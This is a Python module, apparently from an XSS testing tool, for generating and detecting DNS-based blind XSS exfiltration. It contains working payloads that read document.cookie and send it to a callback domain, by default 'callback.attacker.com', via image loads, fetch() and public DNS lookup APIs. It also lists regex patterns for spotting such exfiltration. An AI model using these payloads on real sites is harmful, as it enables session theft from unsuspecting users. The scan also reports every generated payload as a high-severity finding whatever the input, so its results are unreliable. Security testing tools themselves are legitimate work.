"""
DNS Blind XSS Detection Module.

Detects and exploits XSS via DNS exfiltration:
- DNS-based OOB payloads
- DNS tunneling for data exfiltration
- Blind XSS detection via DNS callbacks
"""

import re
from typing import Dict, List
from dataclasses import dataclass
from enum import Enum


class DNSExfiltrationMethod(Enum):
    """DNS exfiltration methods."""
    SUBDOMAIN = "subdomain"
    TXT_RECORD = "txt_record"
    MX_RECORD = "mx_record"
    NS_RECORD = "ns_record"
    CNAME_RECORD = "cname_record"


@dataclass
class DNSXSSVulnerability:
    """DNS-based XSS vulnerability."""
    method: DNSExfiltrationMethod
    payload: str
    callback_domain: str
    severity: str
    context: str


class DNSBlindXSSDetector:
    """
    Advanced DNS blind XSS detector.
    Detects XSS vulnerabilities that can exfiltrate data via DNS.
    """

    # DNS exfiltration payload templates
    DNS_PAYLOADS = {
        DNSExfiltrationMethod.SUBDOMAIN: [
            "<script>new Image().src='http://{data}.{domain}/'</script>",
            "<img src=x onerror=\"new Image().src='http://'+document.cookie+'.{domain}/'\">",
            "<svg onload=\"fetch('http://{domain}/?c='+btoa(document.cookie))\">",
        ],
        DNSExfiltrationMethod.TXT_RECORD: [
            "<script>fetch('https://dns.google/resolve?name='+btoa(document.cookie)+'.{domain}&type=TXT')</script>",
            "<img src=x onerror=\"fetch('https://dns.google/resolve?name='+btoa(document.cookie)+'.{domain}&type=TXT')\">",
        ],
        DNSExfiltrationMethod.MX_RECORD: [
            "<script>fetch('https://api.hackertarget.com/mxlookup/?q='+btoa(document.cookie)+'.{domain}')</script>",
        ],
        DNSExfiltrationMethod.NS_RECORD: [
            "<script>fetch('https://api.hackertarget.com/nslookup/?q='+btoa(document.cookie)+'.{domain}')</script>",
        ],
        DNSExfiltrationMethod.CNAME_RECORD: [
            "<script>fetch('https://api.hackertarget.com/hostsearch/?q='+btoa(document.cookie)+'.{domain}')</script>",
        ],
    }

    # Blind XSS detection patterns
    BLIND_PATTERNS = [
        r'new\s+Image\s*\(\s*\)\.src\s*=\s*["\'][^"\']*[?&]',
        r'fetch\s*\([^)]*["\'][^"\']*[?&]',
        r'XMLHttpRequest.*open.*["\'][^"\']*[?&]',
        r'\.src\s*=\s*["\'][^"\']*[?&]',
        r'href\s*=\s*["\'][^"\']*[?&]',
    ]

    # Data exfiltration patterns
    EXFILTRATION_PATTERNS = [
        r'document\.cookie',
        r'localStorage\.getItem',
        r'sessionStorage\.getItem',
        r'document\.referrer',
        r'window\.location\.href',
        r'navigator\.userAgent',
        r'indexedDB',
    ]

    def __init__(self):
        self._vulnerabilities: List[DNSXSSVulnerability] = []

    def generate_dns_payloads(
        self,
        callback_domain: str,
        method: DNSExfiltrationMethod = DNSExfiltrationMethod.SUBDOMAIN,
        data: str = "{data}",
        marker: str = "xoxss"
    ) -> List[str]:
        """
        Generate DNS exfiltration payloads.

        Args:
            callback_domain: Domain for DNS callbacks
            method: Exfiltration method
            data: Data to exfiltrate (placeholder)
            marker: Unique marker

        Returns:
            List of payload strings
        """
        templates = self.DNS_PAYLOADS.get(method, [])
        payloads = []

        for template in templates:
            payload = template.format(domain=callback_domain, data=data)
            # Replace alert(1) with marker if present
            payload = payload.replace("alert(1)", f"alert('{marker}')")
            payloads.append(payload)

        return payloads

    def detect_dns_exfiltration(self, js_content: str, html_content: str = "") -> List[DNSXSSVulnerability]:
        """
        Detect potential DNS exfiltration vectors.

        Args:
            js_content: JavaScript source code
            html_content: HTML source code

        Returns:
            List of detected vulnerabilities
        """
        vulnerabilities = []
        combined = js_content + "\n" + html_content
        lines = combined.split('\n')

        for line_num, line in enumerate(lines, 1):
            # Check for blind XSS patterns
            for pattern in self.BLIND_PATTERNS:
                if re.search(pattern, line, re.IGNORECASE):
                    # Check if exfiltration data is present
                    for exfil_pattern in self.EXFILTRATION_PATTERNS:
                        if re.search(exfil_pattern, line, re.IGNORECASE):
                            vulnerabilities.append(DNSXSSVulnerability(
                                method=DNSExfiltrationMethod.SUBDOMAIN,
                                payload=line.strip(),
                                callback_domain="detected",
                                severity="high",
                                context=f"Line {line_num}: Potential DNS exfiltration"
                            ))
                            break

        return vulnerabilities

    def check_dns_rebinding(self, js_content: str) -> bool:
        """
        Check for DNS rebinding attack vectors.

        Args:
            js_content: JavaScript source code

        Returns:
            True if DNS rebinding potential detected
        """
        patterns = [
            r'location\.hostname',
            r'document\.domain',
            r'window\.location\.host',
        ]

        for pattern in patterns:
            if re.search(pattern, js_content, re.IGNORECASE):
                return True
        return False

    def scan_for_dns_xss(
        self,
        js_content: str,
        html_content: str = "",
        callback_domain: str = "callback.attacker.com",
        marker: str = "xoxss"
    ) -> List[DNSXSSVulnerability]:
        """
        Scan for DNS-based XSS vulnerabilities.

        Args:
            js_content: JavaScript source code
            html_content: HTML source code
            callback_domain: Domain for DNS callbacks
            marker: Unique marker

        Returns:
            List of detected vulnerabilities
        """
        self._vulnerabilities = []

        # Detect existing exfiltration vectors
        detected = self.detect_dns_exfiltration(js_content, html_content)
        self._vulnerabilities.extend(detected)

        # Generate test payloads for all methods
        for method in DNSExfiltrationMethod:
            payloads = self.generate_dns_payloads(callback_domain, method, "{data}", marker)
            for payload in payloads:
                vuln = DNSXSSVulnerability(
                    method=method,
                    payload=payload,
                    callback_domain=callback_domain,
                    severity="high",
                    context=f"Generated {method.value} payload"
                )
                self._vulnerabilities.append(vuln)

        return self._vulnerabilities

    def assess_dns_risk(self, vulnerabilities: List[DNSXSSVulnerability]) -> str:
        """Assess overall DNS XSS risk."""
        if not vulnerabilities:
            return "none"

        high_severity = [v for v in vulnerabilities if v.severity == "high"]
        if high_severity:
            return "critical"

        return "high"

    def get_dns_summary(self) -> Dict[str, int]:
        """Get summary of DNS findings."""
        summary = {
            "total_vulnerabilities": len(self._vulnerabilities),
            "by_method": {
                "subdomain": sum(1 for v in self._vulnerabilities if v.method == DNSExfiltrationMethod.SUBDOMAIN),
                "txt_record": sum(1 for v in self._vulnerabilities if v.method == DNSExfiltrationMethod.TXT_RECORD),
                "mx_record": sum(1 for v in self._vulnerabilities if v.method == DNSExfiltrationMethod.MX_RECORD),
                "ns_record": sum(1 for v in self._vulnerabilities if v.method == DNSExfiltrationMethod.NS_RECORD),
                "cname_record": sum(1 for v in self._vulnerabilities if v.method == DNSExfiltrationMethod.CNAME_RECORD),
            },
        }
        return summary


__all__ = [
    "DNSBlindXSSDetector",
    "DNSExfiltrationMethod",
    "DNSXSSVulnerability",
]
